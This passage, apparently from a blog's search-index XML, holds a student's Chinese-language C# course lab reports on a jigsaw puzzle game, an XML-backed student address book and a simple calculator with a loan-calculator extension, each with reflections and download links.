实验体会</h5><ol><li>对于这一次实验的PictureBox以及鼠标的拖拉事件有了清楚的认识。</li><li>在做扩展项目的时候对于Timer这一个控件有深刻的理解，Timer每次Start都会运行一次它所包含的Tick事件直至Stop，所以编写程序的时候会利用这一个特性对其进行扩展。</li><li>这一次这个实验我还利用上个实验所使用的增加编辑窗体来改变难度系数功能，这一功能存在于挑战模式，限时前提下还可以选择更高的难度。</li><li>通过本次实验还了解到原来利用Timer还能够是Label控件动态显示以实现数秒功能。</li></ol><h5 id="代码下载地址：拼图游戏"><a href="#代码下载地址：拼图游戏" class="headerlink" title="代码下载地址：拼图游戏"></a>代码下载地址：<a href="http://download.csdn.net/download/u011377996/10228622" target="_blank" rel="noopener">拼图游戏</a></h5><h5 id="仅是为了记录自己的学习过程，请大佬们勿喷！！"><a href="#仅是为了记录自己的学习过程，请大佬们勿喷！！" class="headerlink" title="仅是为了记录自己的学习过程，请大佬们勿喷！！"></a>仅是为了记录自己的学习过程，请大佬们勿喷！！</h5>]]></content>
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>程序设计课 C#作业报告二</title>
      <link href="/2018/01/28/Csharp-work2/"/>
      <url>/2018/01/28/Csharp-work2/</url>
      <content type="html"><![CDATA[<h2 id="实验二-学生通讯录"><a href="#实验二-学生通讯录" class="headerlink" title="实验二 学生通讯录"></a>实验二 学生通讯录</h2><p>   开发一个采用xml格式存储数据的学生通讯录，具备学生信息添加，编辑，删除，查找等功能，该项目是一个多窗体桌面程序，不同窗体上面分别布置了工具条，按钮，数据列表等控件，便于操作学生信息。通过鼠标单击工具条上的“添加”按<br>   <a id="more"></a><br>   钮，弹出添加学生信息的窗体；选中一条学生信息后，单击工具条上的“编辑”按钮，弹出修改学生信息的窗体；点击工具条上的“查找”按钮，弹出查找学生信息的窗口。</p><h5 id="1-界面设计"><a href="#1-界面设计" class="headerlink" title="1.  界面设计"></a>1.  界面设计</h5><p><img src="https://s1.ax1x.com/2018/05/20/CgcaUx.png" alt="CgcaUx.png"></p><h5 id="2-功能实现"><a href="#2-功能实现" class="headerlink" title="2. 功能实现"></a>2. 功能实现</h5><p>   能够实现添加，编辑，删除，查找这几个功能，就不详细叙述了。。。。。</p><h5 id="3-拓展功能"><a href="#3-拓展功能" class="headerlink" title="3. 拓展功能"></a>3. 拓展功能</h5><ol><li><p>备份与恢复功能：</p><p><img src="https://s1.ax1x.com/2018/05/20/Cgc0PK.png" alt="Cgc0PK.png"><br><img src="https://s1.ax1x.com/2018/05/20/Cgcrxe.png" alt="Cgcrxe.png"></p></li><li><p>侧栏的树形图显示，就是利用了搜索作用把它显示出来而已：</p></li></ol><p><img src="https://s1.ax1x.com/2018/05/20/CgcyKH.png" alt="CgcyKH.png"></p><h5 id="4-实验体会"><a href="#4-实验体会" class="headerlink" title="4. 实验体会"></a>4. 实验体会</h5><ol><li>这一次实验让我从整体上了解一个项目大概要怎么去分块，比如在这一次的程序中的StudentsInfoBll得类就是专门存放各种操作函数的，还有单独定义的一个StudentInfo类等等，一旦这样定义起来，调用他们就十分方便。</li><li>另外这个实验项目让我知道了如何用C#调用多个窗体框来实现各种功能，首先新建一个Windows应用窗体，然后在一个主窗体里面调用另外一个窗体的ShowDialog函数，这样就能显示另外一个窗口。在我看来，，这个时候的类就显得尤为重要，他们是各个窗口之间联系的桥梁，使之能够更好地进行操作。     </li><li>此外还了解到xml文件在C#里边的作用，原来xml文件还可以有类似数据库的作用，但是又不能完全起到数据库的作用，比如书本上的代码是以学生id搜索的，这样就导致某些情况它会导致程序的某些部分出现冲突而导致程序崩溃，所以面对这种情况我自己给它多定义一个搜索的主键，让它不会在某种情况下再次出现冲突。</li><li>了解到一个新控件TreeView的作用，它能通过里面的事件MouseClick来设置多种事件，此外还了解到新控件DataGridview的显示与返回列表的对应性，一旦你超出设置列的范围他就会报错，所以一定要返回的列表数对应它显示的列数。</li></ol><h5 id="代码下载地址：学生通讯录"><a href="#代码下载地址：学生通讯录" class="headerlink" title="代码下载地址：学生通讯录"></a>代码下载地址：<a href="http://download.csdn.net/download/u011377996/10228604" target="_blank" rel="noopener">学生通讯录</a></h5>]]></content>
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>程序设计课 C#的作业报告一</title>
      <link href="/2018/01/28/Csharp-work1/"/>
      <url>/2018/01/28/Csharp-work1/</url>
      <content type="html"><![CDATA[<h2 id="实验一-简单计数器"><a href="#实验一-简单计数器" class="headerlink" title="实验一 简单计数器"></a>实验一 简单计数器</h2><p>   通过C#开发一个计算器,该计算器是一个典型的窗体桌面程序，在主题上放置了按钮，文本框等控件，设置了主窗体标题<br>   <a id="more"></a>，边框，显示位置等属性，并为不同的空间添加了相应的事件和可执行的代码，能够完成同一运算优先级的四则运算。</p><h5 id="1-界面设计"><a href="#1-界面设计" class="headerlink" title="1.  界面设计"></a>1.  界面设计</h5><p><img src="https://s1.ax1x.com/2018/05/20/CgceDs.png" alt="CgceDs.png"></p><h5 id="2-功能实现"><a href="#2-功能实现" class="headerlink" title="2. 功能实现"></a>2. 功能实现</h5><p>   计算“5<em>8+5+5”，依次单击按钮“5”、“</em>”、“8”、“+”、“5”、“+”、“5”，然后单击按钮“=”，显示框的数值为50，如下图所示：</p><p><img src="https://s1.ax1x.com/2018/05/20/CgcuEq.png" alt="CgcuEq.png"></p><h5 id="3-拓展功能"><a href="#3-拓展功能" class="headerlink" title="3. 拓展功能"></a>3. 拓展功能</h5><p>  扩展计算器的使用领域，开发贷款计算器，选择等额本金后的计算结果如下图显示：</p><p><img src="https://s1.ax1x.com/2018/05/20/CgcM5V.png" alt="CgcM5V.png"></p><h5 id="4-实验体会"><a href="#4-实验体会" class="headerlink" title="4. 实验体会"></a>4. 实验体会</h5><p>  1.这是我第一次使用C#来开发这样的界面程序，初步认识了C#的操作，大概就是对应一个按钮就是一个事件，并可以在他对应函数里边编写相应的程序。而且还认识到了各种操作函数，例如：ToString，Text，Covert。ToDouble等函数。<br>2.其实那个简单的计算器还有许多弊端，比如优先级还不能考虑进去，可以考虑一下用两个栈去解决，还有输入两个符号的时候能不能直接不让用户去输入而取消报错。另外还有扩展项目里面那个在文本框里面输入字母的时候可不可以限制他输入等等这些问题都有待思考与解决。</p><h5 id="代码下载地址：简单计算器"><a href="#代码下载地址：简单计算器" class="headerlink" title="代码下载地址：简单计算器"></a>代码下载地址：<a href="http://download.csdn.net/download/u011377996/10227814" target="_blank" rel="noopener">简单计算器</a></h5>]]></content>
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
